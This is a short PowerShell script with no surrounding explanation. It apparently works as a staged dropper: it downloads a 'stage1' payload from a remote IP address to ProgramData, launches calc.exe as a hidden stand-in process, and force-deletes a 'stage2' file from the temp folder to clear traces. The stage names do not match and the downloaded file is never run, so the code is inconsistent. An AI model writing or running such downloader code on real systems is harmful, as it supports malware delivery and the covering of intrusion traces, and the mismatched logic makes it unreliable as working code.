
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.24/stage1.ps1",
    [string]$Stage2Path = 'C:\ProgramData\stage1.bin'
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $Stage2Path)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
